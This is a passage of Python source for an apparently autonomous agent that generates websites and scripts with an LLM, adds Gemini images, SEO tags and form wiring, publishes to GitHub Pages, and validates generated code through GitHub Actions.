        if prompt in replacements:
            continue
        idx += 1
        image_bytes, mime_or_err = ask_gemini_image(prompt)
        if image_bytes:
            webp_bytes, webp_ext = _convert_to_webp(image_bytes)
            if webp_bytes:
                image_bytes, ext = webp_bytes, webp_ext
            else:
                ext = "jpg" if "jpeg" in mime_or_err or "jpg" in mime_or_err else "png"
            filename = "images/img" + str(idx) + "." + ext
            ok, result = create_github_file_binary(
                WEB_REPO_NAME, tool_folder_name + "/" + filename, image_bytes,
                "Add generated image " + filename
            )
            if ok:
                replacements[prompt] = result
                notes.append("Generated image via Gemini for: " + prompt[:70])
                continue
            notes.append("Gemini generated an image but the GitHub upload failed for '" + prompt[:60] + "': " + result)
        else:
            notes.append("Gemini image generation failed for '" + prompt[:60] + "' (" + str(mime_or_err) + ") — used a placeholder photo instead.")
        replacements[prompt] = "https://picsum.photos/seed/" + _slugify_for_placeholder(prompt) + "/1600/900"

    def _sub(m):
        prompt = m.group(2).strip()
        url = replacements.get(prompt, "https://picsum.photos/seed/" + _slugify_for_placeholder(prompt) + "/1600/900")
        return "src=" + m.group(1) + url + m.group(1)

    new_html = _GENIMAGE_SRC_RE.sub(_sub, html_code)
    return new_html, notes, idx

def generate_brand_assets(idea, tool_folder_name):
    """
    Generates a square logomark (favicon/apple-touch-icon) and a wide
    social-preview image (Open Graph card) for the site via Gemini, and
    uploads both under <tool_folder_name>/images/. Returns
    (icon_url, og_image_url); either can be None if generation isn't
    available (no GEMINI_API_KEY, rate-limited, etc.) — callers must treat
    both as optional and simply skip the corresponding tags.
    """
    icon_url = None
    og_image_url = None
    icon_bytes, icon_mime = ask_gemini_image(
        "A minimal, modern square app-icon-style logomark representing: " + idea +
        ". Flat design, one bold simple shape/symbol, no text, high contrast, reads clearly at small sizes.",
        aspect_ratio="1:1"
    )
    if icon_bytes:
        ok, result = create_github_file_binary(
            WEB_REPO_NAME, tool_folder_name + "/images/icon.png", icon_bytes, "Add brand icon"
        )
        if ok:
            icon_url = result
    og_bytes, og_mime = ask_gemini_image(
        "A polished social-media preview image (Open Graph card) for a website about: " + idea +
        ". Wide landscape composition, visually represents the idea, no placeholder or lorem-ipsum text baked into the image.",
        aspect_ratio="16:9"
    )
    if og_bytes:
        ok, result = create_github_file_binary(
            WEB_REPO_NAME, tool_folder_name + "/images/og-image.png", og_bytes, "Add social preview image"
        )
        if ok:
            og_image_url = result
    return icon_url, og_image_url

def _extract_tag_text(html_code, pattern, fallback):
    m = re.search(pattern, html_code, re.IGNORECASE | re.DOTALL)
    text = m.group(1).strip() if m else ""
    text = re.sub(r"\s+", " ", text)
    return (text or fallback)[:160]

def build_seo_head_snippet(html_code, idea, page_url, icon_url, og_image_url):
    """
    Builds a block of <meta>/<link>/<script type="ld+json"> tags covering
    Open Graph, Twitter Card, canonical URL, icons, and basic JSON-LD —
    the SEO/sharing essentials a real agency site ships with. Only adds
    tags that aren't already present (checked by a simple substring test),
    so it's safe to run even if the writer model already added some of
    its own.
    """
    title = _extract_tag_text(html_code, r"<title>(.*?)</title>", idea[:60]).replace('"', "'")
    description = _extract_tag_text(
        html_code, r'<meta\s+name=["\']description["\']\s+content=["\'](.*?)["\']', idea[:150]
    ).replace('"', "'")
    lower = html_code.lower()
    parts = []
    if "og:title" not in lower:
        parts.append('<meta property="og:title" content="' + title + '">')
    if "og:description" not in lower:
        parts.append('<meta property="og:description" content="' + description + '">')
    if "og:type" not in lower:
        parts.append('<meta property="og:type" content="website">')
    if page_url and "og:url" not in lower:
        parts.append('<meta property="og:url" content="' + page_url + '">')
    if og_image_url and "og:image" not in lower:
        parts.append('<meta property="og:image" content="' + og_image_url + '">')
    if "twitter:card" not in lower:
        parts.append('<meta name="twitter:card" content="summary_large_image">')
        parts.append('<meta name="twitter:title" content="' + title + '">')
        parts.append('<meta name="twitter:description" content="' + description + '">')
        if og_image_url:
            parts.append('<meta name="twitter:image" content="' + og_image_url + '">')
    if page_url and "rel=\"canonical\"" not in lower and "rel='canonical'" not in lower:
        parts.append('<link rel="canonical" href="' + page_url + '">')
    if icon_url and "apple-touch-icon" not in lower:
        parts.append('<link rel="apple-touch-icon" href="' + icon_url + '">')
    if icon_url and "rel=\"icon\"" not in lower and "rel='icon'" not in lower:
        parts.append('<link rel="icon" type="image/png" href="' + icon_url + '">')
    if "application/ld+json" not in lower:
        ld = {"@context": "https://schema.org", "@type": "WebSite", "name": title, "description": description}
        if page_url:
            ld["url"] = page_url
        parts.append('<script type="application/ld+json">' + json.dumps(ld) + '</script>')
    return "\n".join(parts)

def _inject_before_head_close(html_code, snippet):
    if not snippet:
        return html_code
    if re.search(r"</head\s*>", html_code, re.IGNORECASE):
        return re.sub(r"</head\s*>", snippet + "\n</head>", html_code, count=1, flags=re.IGNORECASE)
    return html_code  # no <head> found — leave untouched rather than guess where to inject

_FORM_TAG_RE = re.compile(r"<form\b([^>]*)>", re.IGNORECASE)

def wire_contact_forms(html_code):
    """
    Auto-wires any <form> that doesn't already have a real action (a real
    URL or a mailto:) to FormSubmit (https://formsubmit.co) — a free,
    keyless form-relay service that just needs a destination email
    address, no signup/API key. Adds a honeypot field for basic spam
    protection. Requires AGENT_EMAIL to be set (the same env var used for
    the agent's other email features); forms are left untouched if it
    isn't, since there's nowhere to route submissions.
    NOTE: FormSubmit requires the destination inbox to click a one-time
    confirmation link the first time it receives a submission — that's a
    real manual step outside this agent's control, not a bug here.
    """
    agent_email = os.environ.get("AGENT_EMAIL")
    if not agent_email:
        return html_code

    def _sub(m):
        attrs = m.group(1)
        has_real_action = re.search(r'action\s*=\s*["\'][^"\']*://', attrs, re.IGNORECASE) or "mailto:" in attrs.lower()
        if has_real_action:
            return m.group(0)
        new_attrs = re.sub(r'\s*action\s*=\s*["\'][^"\']*["\']', "", attrs, flags=re.IGNORECASE)
        new_attrs = re.sub(r'\s*method\s*=\s*["\'][^"\']*["\']', "", new_attrs, flags=re.IGNORECASE)
        new_attrs += ' method="POST" action="https://formsubmit.co/' + agent_email + '"'
        return ('<form' + new_attrs + '>\n'
                '<input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">\n'
                '<input type="hidden" name="_captcha" value="false">')

    return _FORM_TAG_RE.sub(_sub, html_code)

_IMG_OPEN_RE = re.compile(r"<img\b(?![^>]*\bloading=)", re.IGNORECASE)

def add_lazy_loading(html_code):
    """Adds loading="lazy" to any <img> that doesn't already specify a loading attribute."""
    return _IMG_OPEN_RE.sub('<img loading="lazy"', html_code)

def build_robots_and_sitemap(base_url, page_filenames):
    robots = "User-agent: *\nAllow: /\nSitemap: " + base_url + "sitemap.xml\n"
    urls = "\n".join(
        "  <url><loc>" + base_url + (f if f != "index.html" else "") + "</loc></url>"
        for f in page_filenames
    )
    sitemap = ('<?xml version="1.0" encoding="UTF-8"?>\n'
               '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
               + urls + "\n</urlset>\n")
    return robots, sitemap

def ensure_site_404_page():
    """
    Pushes a single, branded 404.html to the repo root (shared across
    every tool folder in WEB_REPO_NAME) if one doesn't already exist —
    GitHub Pages serves this automatically for any unmatched path on the
    whole site instead of its generic default 404.
    """
    if get_github_file_sha(WEB_REPO_NAME, "404.html"):
        return  # already exists — don't overwrite a page that might've been customized
    page = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Page not found</title>
<style>
  body { font-family: -apple-system, system-ui, sans-serif; background:#0f0f12; color:#f5f5f5; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; }
  .wrap { padding: 2rem; }
  h1 { font-size: 5rem; margin: 0; }
  p { color:#a0a0a8; }
  a { color:#7dd3fc; text-decoration:none; }
  a:hover { text-decoration:underline; }
</style>
</head>
<body>
  <div class="wrap">
    <h1>404</h1>
    <p>This page doesn't exist.</p>
    <a href="javascript:history.back()">&larr; Go back</a>
  </div>
</body>
</html>"""
    print(create_github_file(WEB_REPO_NAME, "404.html", page, "Add shared 404 page"))

def push_web_tool_to_github(tool_folder_name, html_code_or_pages, idea=""):
    """
    html_code_or_pages is either a single HTML string (the normal
    single-file case) or a dict of {filename: html_string} for multi-page
    sites (e.g. {"index.html": ..., "about.html": ..., "contact.html": ...}).
    Every file lands under the same tool folder so relative links between
    pages (href="about.html") keep working once published.

    Before pushing, this now also:
    - Resolves genimage: placeholders (see DESIGN_RULES) to real
      Gemini-generated images uploaded under <tool_folder_name>/images/.
    - Generates a brand icon + Open Graph preview image via Gemini.
    - Injects OG/Twitter/canonical/JSON-LD tags (only where missing).
    - Auto-wires any contact/signup <form> lacking a real action to
      FormSubmit (see wire_contact_forms docstring for the caveat).
    - Adds loading="lazy" to images and pushes a robots.txt + sitemap.xml.
    - Ensures the repo has one shared, branded 404 page.
    None of this fails the build if it can't complete (missing
    GEMINI_API_KEY/AGENT_EMAIL just means those specific extras are
    skipped) — only a failed HTML push itself returns False.
    """
    print(create_github_repo(WEB_REPO_NAME, description="Web tools built by my agent"))
    pages = html_code_or_pages if isinstance(html_code_or_pages, dict) else {"index.html": html_code_or_pages}

    resolved_pages = {}
    idx = 0
    for filename, content in pages.items():
        new_content, notes, idx = resolve_genimage_placeholders(content, tool_folder_name, image_index_start=idx)
        for note in notes:
            print(note)
        resolved_pages[filename] = new_content

    username = get_github_username()
    base_url = ("https://" + username + ".github.io/" + WEB_REPO_NAME + "/" + tool_folder_name + "/") if username else None
    icon_url, og_image_url = generate_brand_assets(idea or tool_folder_name, tool_folder_name)

    final_pages = {}
    for filename, content in resolved_pages.items():
        page_url = (base_url + (filename if filename != "index.html" else "")) if base_url else None
        seo_snippet = build_seo_head_snippet(content, idea or tool_folder_name, page_url, icon_url, og_image_url)
        content = _inject_before_head_close(content, seo_snippet)
        content = wire_contact_forms(content)
        content = add_lazy_loading(content)
        content, stripe_notes = resolve_stripe_placeholders(content, owner_email=os.environ.get("AGENT_EMAIL"))
        for note in stripe_notes:
            print(note)
        final_pages[filename] = content

    for filename, content in final_pages.items():
        push_result = create_github_file(WEB_REPO_NAME, tool_folder_name + "/" + filename, content, "Add " + tool_folder_name + "/" + filename)
        if push_result.startswith("ERROR") or push_result.startswith("Could not"):
            return False, push_result

    if base_url:
        robots_txt, sitemap_xml = build_robots_and_sitemap(base_url, list(final_pages.keys()))
        print(create_github_file(WEB_REPO_NAME, tool_folder_name + "/robots.txt", robots_txt, "Add robots.txt"))
        print(create_github_file(WEB_REPO_NAME, tool_folder_name + "/sitemap.xml", sitemap_xml, "Add sitemap.xml"))
    else:
        # Files pushed fine, but we can't determine the real GitHub Pages
        # URL without a username — returning a "https://None.github.io/..."
        # URL as if it were a success would be worse than reporting the
        # failure, since the caller/user would get a link that can never work.
        return False, "Pushed files successfully, but could not determine GitHub username to build the Pages URL."
    ensure_site_404_page()

    print(ensure_github_pages_enabled(WEB_REPO_NAME))

    # Real verification — re-fetch the tool's folder instead of trusting
    # the per-file create_github_file() responses collected above. This
    # matches the same check the buildsite: multi-file pipeline does:
    # never report success purely on the strength of earlier 200/201s.
    try:
        verify = requests.get(
            "https://api.github.com/repos/" + username + "/" + WEB_REPO_NAME + "/contents/" + tool_folder_name,
            headers=github_headers(), timeout=20
        )
        if verify.status_code == 200:
            verify_data = _github_json(verify)
            if isinstance(verify_data, list):
                verified_names = set(item["name"] for item in verify_data if item.get("type") == "file")
                missing = [f for f in final_pages if f not in verified_names]
                if missing:
                    print("WARNING: verification found these files missing from GitHub despite a successful-looking push: " + ", ".join(missing))
                else:
                    print("Verified via GitHub API — all " + str(len(final_pages)) + " page(s) confirmed present in " + tool_folder_name + "/")
            else:
                print("WARNING: could not verify push — GitHub returned an unexpected response shape when re-fetching " + tool_folder_name + "/")
        else:
            print("WARNING: could not verify push — GitHub returned status " + str(verify.status_code) + " when re-fetching " + tool_folder_name + "/")
    except requests.exceptions.RequestException as e:
        print("WARNING: could not verify push — GitHub unreachable during verification (" + str(e) + "). Files were likely pushed but unconfirmed.")

    return True, base_url

MAX_WEB_EDIT_ATTEMPTS = 2

def find_web_tool_by_ref(ref):
    """
    Resolves a user-given reference to a shipped web tool — either an
    exact tool id (e.g. "tool_12") or free-text describing it — to its
    tools_index entry. Falls back to the same semantic-match lookup used
    when deciding whether to reuse a tool for a NEW build request
    (find_matching_web_tool), just callable directly for an explicit edit.
    """
    ref = ref.strip()
    web_tools = [t for t in load_tools_index() if t.get("type") == "web"]
    for t in web_tools:
        if t["id"] == ref:
            return t
    return find_matching_web_tool(ref)

def fetch_web_tool_pages(tool):
    """
    Downloads the CURRENT live HTML for every page of an already-shipped
    web tool from GitHub, so an edit is applied against what's actually
    published rather than a stale/mismatched local copy. Discovers the
    real page list via list_github_dir() instead of guessing filenames.
    Returns {filename: html} — empty dict if nothing could be fetched.
    """
    username = get_github_username()
    folder = tool.get("folder")
    if not username or not folder:
        return {}
    filenames = [f for f in list_github_dir(WEB_REPO_NAME, folder) if f.lower().endswith(".html")]
    if not filenames:
        filenames = ["index.html"]
    pages = {}
    for fname in filenames:
        try:
            resp = requests.get(
                "https://raw.githubusercontent.com/" + username + "/" + WEB_REPO_NAME + "/main/" + folder + "/" + fname,
                timeout=15
            )
            if resp.status_code == 200 and resp.text.strip():
                pages[fname] = resp.text
        except requests.exceptions.RequestException:
            pass
    return pages

def write_patch_for_web(idea, current_html, change_request, previous_error=""):
    """
    Targeted-edit counterpart to write_code_for_web(): sends the CURRENT
    shipped HTML plus one specific change request, and asks for the file
    back with ONLY that change applied. This is what makes a small tweak
    cheap — one prompt against existing content instead of a full
    regenerate-from-scratch pass through DESIGN_RULES — which matters
    since a full rebuild burns real API credits for what might be a
    one-line copy change.
    """
    err_block = ("\n\nPrevious attempt at this edit failed: " + previous_error +
                 "\nFix the ROOT CAUSE while still only touching what's needed for the requested change.") if previous_error else ""
    prompt = ("""You are editing an EXISTING, already-shipped website. Original context: """ + idea + """

Requested change: """ + change_request + err_block + """

Current live HTML:
\"\"\"
""" + current_html + """
\"\"\"

Apply ONLY the requested change. Keep everything else — structure, copy, styling, scripts — exactly as it is unless the change genuinely requires touching it. Do not "improve" or rewrite unrelated parts, and do not regenerate content nobody asked about.
Reply with ONLY the complete, corrected HTML file, no markdown fences and no commentary.""")
    return strip_fences(ask_ai(prompt))

def push_web_tool_update(tool_folder_name, pages):
    """
    Lighter-weight sibling of push_web_tool_to_github() for an edit to an
    ALREADY-shipped site: still resolves any newly-added genimage:
    placeholders and re-wires forms/lazy-loading, but skips regenerating
    the brand icon/OG image (those already exist from the original build)
    and skips recreating robots.txt/sitemap.xml/404 (unaffected by an
    edit to existing pages). Keeps a small edit from burning an extra
    Gemini image-generation call for no reason.
    """
    resolved_pages = {}
    idx = 0
    for filename, content in pages.items():
        new_content, notes, idx = resolve_genimage_placeholders(content, tool_folder_name, image_index_start=idx)
        for note in notes:
            print(note)
        new_content = wire_contact_forms(add_lazy_loading(new_content))
        new_content, stripe_notes = resolve_stripe_placeholders(new_content, owner_email=os.environ.get("AGENT_EMAIL"))
        for note in stripe_notes:
            print(note)
        resolved_pages[filename] = new_content

    for filename, content in resolved_pages.items():
        push_result = create_github_file(WEB_REPO_NAME, tool_folder_name + "/" + filename, content, "Edit " + tool_folder_name + "/" + filename)
        if push_result.startswith("ERROR") or push_result.startswith("Could not"):
            return False, push_result
    username = get_github_username()
    url = ("https://" + username + ".github.io/" + WEB_REPO_NAME + "/" + tool_folder_name + "/") if username else "(published — could not determine URL)"
    return True, url

def edit_web_tool_workflow(ref, change_request):
    """
    Top-level entry point for 'editsite: <tool ref> | <change>'. Finds the
    tool, pulls its live HTML, asks for a targeted patch, runs it through
    the same QA gate as a fresh build (minus the tester-agent play-test —
    a small copy/layout tweak doesn't need a full playtest pass), and
    pushes only if it passes. Only edits the homepage/index page of a
    multi-page site — editing a specific secondary page isn't supported
    yet, so mention that explicitly if the request seems to target one.
    """
    tool = find_web_tool_by_ref(ref)
    if not tool:
        return "Could not find a matching web tool for '" + ref + "' — check ids with 'tools' or describe it more specifically."
    folder = tool.get("folder")
    if not folder:
        return "Tool " + tool["id"] + " has no folder on record — can't fetch its live HTML to edit."
    pages = fetch_web_tool_pages(tool)
    if not pages:
        return "Could not fetch the current live HTML for " + tool["id"] + " (" + str(tool.get("url")) + ") — nothing to edit."
    wants_professional_site = not (_idea_wants_game(tool["idea"]) or _idea_wants_teardown(tool["idea"]))
    home_filename = "index.html" if "index.html" in pages else next(iter(pages))

    # BUG FIX: the docstring above has always promised that a request
    # targeting a secondary page gets flagged explicitly instead of being
    # silently misapplied — but that check was never actually implemented.
    # Previously "editsite: tool_5 | fix the typo on the about page" would
    # just silently patch index.html (the only page this function touches)
    # while about.html stayed untouched and wrong, with no indication to
    # the user that their actual request wasn't honored. Now checks other
    # known page filenames/stems for a mention before proceeding.
    other_pages = [f for f in pages if f != home_filename]
    change_lower = change_request.lower()
    for f in other_pages:
        stem = f[:-5] if f.lower().endswith(".html") else f  # "about.html" -> "about"
        if (stem and re.search(r"\b" + re.escape(stem.lower()) + r"\b", change_lower)) or f.lower() in change_lower:
            return ('This looks like it\'s targeting "' + f + '", but editsite only supports editing '
                    "the homepage (" + home_filename + ") right now. Editing a specific secondary page "
                    "isn't supported yet — you'll need to rebuild the site or edit that page manually.")

    previous_error = ""
    for attempt in range(1, MAX_WEB_EDIT_ATTEMPTS + 1):
        print("--- Edit attempt " + str(attempt) + " ---")
        new_home = write_patch_for_web(tool["idea"], pages[home_filename], change_request, previous_error=previous_error)
        success, output = check_web_output(new_home, require_professional_site=wants_professional_site)
        if success:
            updated_pages = dict(pages)
            updated_pages[home_filename] = new_home
            pushed, url_or_error = push_web_tool_update(folder, updated_pages)
            if not pushed:
                return "Edit built but could not publish: " + url_or_error
            return "Applied edit to " + tool["id"] + " after " + str(attempt) + " attempt(s). Live at: " + url_or_error
        previous_error = output
        print("Edit failed QA: " + output)
    return ("Could not apply that edit to " + tool["id"] + " after " + str(MAX_WEB_EDIT_ATTEMPTS) +
            " attempts without breaking the page. Last problem:\n" + previous_error)

def ask_clarifying_questions(idea):
    """
    Prints 2-4 short clarifying questions about `idea` and reads one
    combined answer from the console before a project build starts.
    Returns the raw answer text (possibly empty if skipped) so callers
    can fold it into the spec/idea as extra context. Uses input(),
    matching this file's existing pattern for approval gates elsewhere
    (e.g. import_github_tool_workflow) — safe here because every caller
    of this function is triggered by an explicit console command, never
    by the unattended dreamer_cycle loop.
    """
    prompt = (
        "You're about to build this as a real project:\n\n" + idea +
        "\n\nBefore building, ask 2-4 SHORT clarifying questions that would meaningfully "
        "change what gets built (e.g. target audience, must-have features, style/tone, "
        "any specific technical requirement). One question per line, no numbering, no preamble."
    )
    questions = ask_ai(prompt).strip()
    if not questions or questions.startswith("ERROR"):
        return ""  # AI call failed — skip clarification rather than block the build
    print("\nBefore I build this, a few quick questions:")
    print(questions)
    try:
        answer = input("\nYour answers (or just press Enter to skip and let me decide): ").strip()
    except EOFError:
        answer = ""  # non-interactive environment — proceed without blocking
    return answer

def build_and_fix_web_workflow(idea_raw, skip_clarify=False):
    idea, force, rival = parse_flags(idea_raw)
    if not force:
        existing = find_matching_web_tool(idea)
        if existing:
            print("Found existing web tool: " + existing["id"] + " — reusing it.")
            update_tool_trust(existing["id"], True)
            return ("Reused existing web tool " + existing["id"] + " (originally built for: \"" + existing.get("idea", "") +
                     "\"): " + existing.get("url", "(no url)") +
                     "\nIf that's not actually what you asked for, add \"!!\" to your request to force a fresh build.")
    print("Building web idea: " + idea)
    if not skip_clarify:
        answer = ask_clarifying_questions(idea)
        if answer:
            idea = idea + "\n\nAdditional requirements from the user: " + answer
    wants_game = _idea_wants_game(idea)
    wants_teardown = (not wants_game) and _idea_wants_teardown(idea)
    wants_3d = _idea_wants_3d(idea) or wants_teardown
    wants_professional_site = (not wants_game) and (not wants_teardown)
    # Multi-page only makes sense for a normal marketing site, not a game
    # or a teardown (both of which are meant to be one focused screen).
    wants_multipage = wants_professional_site and _idea_wants_multipage(idea)
    if wants_game:
        print("Detected this as a playable game — using professional game-dev rules.")
    if wants_multipage:
        print("Detected this as a multi-page site — building linked pages instead of one file.")

    # A keyless kvdb.io bucket (no signup, no API key) is created ONCE up
    # front — before the retry loop — and reused across every attempt, so
    # a flaky generation retry doesn't spawn a new orphaned bucket each
    # time. If bucket creation fails (service unreachable), the build
    # just proceeds without a backend rather than failing outright.
    wants_backend = wants_professional_site and _idea_wants_backend(idea)
    kvdb_bucket = None
    if wants_backend:
        kvdb_bucket = create_kvdb_bucket()
        if kvdb_bucket:
            print("Detected this needs shared data persistence — wired a keyless kvdb.io backend.")
        else:
            print("This idea wants shared data persistence but the keyless backend service was unreachable — building without it.")

    # User accounts + private per-user data need Firebase (free forever on
    # the Spark plan, but requires a one-time project setup on the user's
    # end — unlike kvdb.io, this can't be spun up automatically). Only
    # wired in if FIREBASE_CONFIG is already set; otherwise print setup
    # instructions once and build without auth rather than failing.
    wants_auth = wants_professional_site and _idea_wants_auth(idea)
    firebase_config = None
    if wants_auth:
        if FIREBASE_CONFIG:
            firebase_config = FIREBASE_CONFIG
            print("Detected this needs real accounts/private data — wired Firebase Auth + Firestore.")
        else:
            print("This idea needs real accounts/private data, but no FIREBASE_CONFIG secret is set — building without login. Run 'firebasesetup' for one-time instructions.")

    # File uploads ride on the same Firebase project as auth (Storage is
    # part of the same free Spark plan) — only meaningful once a user is
    # logged in to own the upload, so this only actually does anything
    # when firebase_config also ended up set above.
    wants_file_upload = wants_professional_site and _idea_wants_file_upload(idea)
    if wants_file_upload and not firebase_config:
        print("This idea wants real file uploads, which need Firebase (same setup as accounts) — building without upload since FIREBASE_CONFIG isn't set.")

    # Payments can't be created from code (that needs a real Stripe
    # account + API key, which this pipeline deliberately doesn't hold) —
    # so this just tells the writer model to leave STRIPE_LINK: <key>
    # placeholders, which get resolved against links the user registers
    # once via 'addstripelink:'. Always safe to enable: an unregistered
    # key just falls back to a mailto instead of breaking anything.
    wants_payment = wants_professional_site and _idea_wants_payment(idea)
    if wants_payment:
        print("Detected this needs a real buy/pay action — wiring STRIPE_LINK: placeholders (register with 'addstripelink:').")

    def _generate(previous_error=""):
        if wants_multipage:
            return write_multipage_web(idea, previous_error=previous_error, kvdb_bucket=kvdb_bucket, firebase_config=firebase_config, wants_payment=wants_payment, wants_file_upload=wants_file_upload)
        return write_code_for_web(idea, previous_error=previous_error, kvdb_bucket=kvdb_bucket, firebase_config=firebase_config, wants_payment=wants_payment, wants_file_upload=wants_file_upload)

    code = _generate()
    for attempt in range(1, MAX_WEB_ATTEMPTS + 1):
        print("--- Web attempt " + str(attempt) + " ---")
        pages = code if isinstance(code, dict) else {"index.html": code}
        home_html = pages.get("index.html", next(iter(pages.values())))

        # Full browser QA (console errors, mobile overflow, structural
        # checks) always runs against the homepage. For a multi-page site
        # the other pages only get the cheaper structural pass — running
        # a full headless-browser load on every page for every retry gets
        # expensive fast, and the homepage is the representative page for
        # shared nav/design/meta issues anyway.
        success, output = check_web_output(home_html, require_3d=wants_3d, require_game=wants_game, require_professional_site=wants_professional_site)
        if success and len(pages) > 1:
            for fname, fcontent in pages.items():
                if fname == "index.html":
                    continue
                sub_ok, sub_msg = check_web_output_structural(fcontent, require_professional_site=wants_professional_site)
                if not sub_ok:
                    success = False
                    output = "Secondary page " + fname + " failed checks: " + sub_msg
                    break

        if success:
            # Passed the load/console-error check — now hand it to the
            # tester agent to actually play it and judge environment/copy/
            # design/performance quality before it's considered done. This
            # is the "someone plays the game and reports back" step.
            play_passed, play_report = play_test_web_output(home_html, idea, wants_game=wants_game)
            env_passed, env_issues = check_environment_quality(home_html, idea)
            all_issues = list(play_report.get("issues", [])) + list(env_issues)

            if wants_professional_site:
                copy_passed, copy_issues = check_copy_quality(home_html, idea)
                design_passed, design_issues = check_design_quality(home_html, idea)
                visual_passed, visual_issues = check_visual_design_quality(home_html, idea)
                a11y_passed, a11y_issues = check_accessibility(home_html)
                perf_passed, perf_issues = check_web_performance(home_html)
                all_issues += copy_issues + design_issues + visual_issues + a11y_issues + perf_issues
            else:
                copy_passed = design_passed = perf_passed = True
                visual_passed = True
                a11y_passed = True

            if not (play_passed and env_passed and copy_passed and design_passed and visual_passed and a11y_passed and perf_passed):
                success = False
                output = "Tester agent found problems:\n- " + "\n- ".join(all_issues)
                print("Failed play-test/quality check: " + output)

        if success:
            index = load_tools_index()
            web_count = len([t for t in index if t.get("type") == "web"]) + 1
            folder_name = "tool_web_" + str(web_count)
            pushed, url_or_error = push_web_tool_to_github(folder_name, pages if len(pages) > 1 else home_html, idea=idea)
            if not pushed:
                return "Built but could not publish: " + url_or_error
            if wants_professional_site:
                save_design_system_from_html(home_html)
            tool_id = register_web_tool(idea, url_or_error, folder_name, kvdb_bucket=kvdb_bucket)
            page_note = (" (" + str(len(pages)) + " linked pages)") if len(pages) > 1 else ""
            return "Web tool built after " + str(attempt) + " attempt(s)" + page_note + ", saved as " + tool_id + ". Open: " + url_or_error
        else:
            print("Failed: " + output)
            if attempt < MAX_WEB_ATTEMPTS:
                code = _generate(previous_error=output)
            else:
                return "Could not build web tool after " + str(MAX_WEB_ATTEMPTS) + " attempts. Last problem:\n" + output
    return "Unexpected end of retry loop."

# ============================================================
# GITHUB BUILD WORKFLOW (make:)
# ============================================================

GITHUB_CODE_FILE = workpath("app.py")
GITHUB_REQUIREMENTS_FILE = workpath("requirements.txt")
# BUG FIX: same shared-scratch-file race as GENERATED_CODE_FILE (see
# _generated_code_file_lock above) — build_and_fix_on_github() writes and
# repeatedly re-reads GITHUB_CODE_FILE across a retry loop that includes
# a GitHub Actions wait (wait_for_run_completion, up to several minutes).
# Two concurrent build_and_fix_on_github() calls (e.g. two independent
# goal steps both targeting the GitHub-app lane) would otherwise silently
# overwrite each other's app.py mid-build.
_github_code_file_lock = threading.Lock()
MAX_GITHUB_ATTEMPTS = 4

def write_code_for_github(idea, previous_error="", injected_url=None, injected_key=None):
    lessons = load_lessons()
    lessons_block = ("\n\nLESSONS:\n" + lessons) if lessons else ""
    injection_block = ""
    if injected_url:
        injection_block += "\nIMPORTANT: Use this exact API endpoint (no key needed): " + injected_url
    if injected_key:
        injection_block += "\nIMPORTANT: Use this API key that was auto-retrieved: " + injected_key

    base_rules = """No manual input required. External packages OK.
CRITICAL: Never hide errors behind fake fallbacks. Print real errors and exit(1) on failure.
Do NOT invent API endpoints or model names.""" + injection_block + lessons_block

    if previous_error:
        prompt = """Write a Python script for: """ + idea + """
Previous error: """ + previous_error + """
Fix the ROOT CAUSE. """ + base_rules + """
Reply in this format:
CODE:
<code>
REQUIREMENTS:
<packages or NONE>"""
    else:
        prompt = """Write a Python script for: """ + idea + """
""" + base_rules + """
Reply in this format:
CODE:
<code>
REQUIREMENTS:
<packages or NONE>"""

    prompt = with_memory(prompt)
    response = ask_ai(prompt)
    retry_count = 0
    while response.startswith("ERROR") and retry_count < 2:
        time.sleep(5)
        response = ask_ai(prompt)
        retry_count += 1

    if "REQUIREMENTS:" in response:
        code_part, req_part = response.split("REQUIREMENTS:", 1)
        code = strip_fences(code_part.replace("CODE:", "").strip())
        requirements = req_part.strip()
    else:
        code = strip_fences(response.replace("CODE:", "").strip())
        requirements = ""

    write_file(GITHUB_CODE_FILE, code)
    cleaned = [l.strip().strip("`") for l in requirements.split("\n") if l.strip() and l.strip().upper() != "NONE"]
    requirements = "\n".join(cleaned)
    if requirements:
        write_file(GITHUB_REQUIREMENTS_FILE, requirements)
    elif os.path.exists(GITHUB_REQUIREMENTS_FILE):
        os.remove(GITHUB_REQUIREMENTS_FILE)
    return code

def ensure_python_runner_yaml(repo_name):
    yaml_content = """name: Run Generated Code
on:
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: python """ + GITHUB_CODE_FILE + """
        env:
          CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
"""
    return create_github_file(repo_name, ".github/workflows/run.yml", yaml_content, "Add runner workflow")

def validate_python_on_github(repo_name):
    print(create_github_repo(repo_name))
    push_result = create_github_file(repo_name, GITHUB_CODE_FILE, read_file(GITHUB_CODE_FILE), "Update app.py")
    print(push_result)
    if push_result.startswith("ERROR") or push_result.startswith("Could not"):
        return False, push_result
    if os.path.exists(GITHUB_REQUIREMENTS_FILE):
        print(create_github_file(repo_name, GITHUB_REQUIREMENTS_FILE, read_file(GITHUB_REQUIREMENTS_FILE), "Update requirements"))
    print(ensure_python_runner_yaml(repo_name))
    time.sleep(5)
    previous_run = get_latest_run(repo_name, "run.yml")
    previous_run_id = previous_run.get("id") if previous_run is not None else None
    triggered, msg = trigger_github_workflow(repo_name, "run.yml")
    if not triggered:
        return False, msg
    print("Waiting for GitHub Actions...")
    run = wait_for_run_completion(repo_name, previous_run_id=previous_run_id)
    if not run or run.get("id") == previous_run_id:
        return False, "Run did not complete within timeout."
    if run.get("conclusion") == "success":
        return True, "Ran successfully on GitHub Actions."
    return False, get_run_logs(repo_name, run.get("id"))[-3000:]

def is_missing_secret_error(log_text):
    lower = log_text.lower()
    return ("environment variable" in lower and "not set" in lower) or \
           ("keyerror" in lower and ("api_key" in lower or "token" in lower))

def build_and_fix_on_github(idea_raw, repo_name):
    idea, force, rival = parse_flags(idea_raw)
    if not force:
        existing = find_matching_github_tool(idea)
        if existing:
            username = get_github_username()
            print("Found existing tool: " + existing["id"] + " (originally built for: \"" + existing.get("idea", "") +
                  "\") — re-running it instead of building new. If this doesn't actually match what you asked for, "
                  "add \"!!\" to the end of your request to force a fresh build.")
            previous_run = get_latest_run(existing["repo_name"], "run.yml")
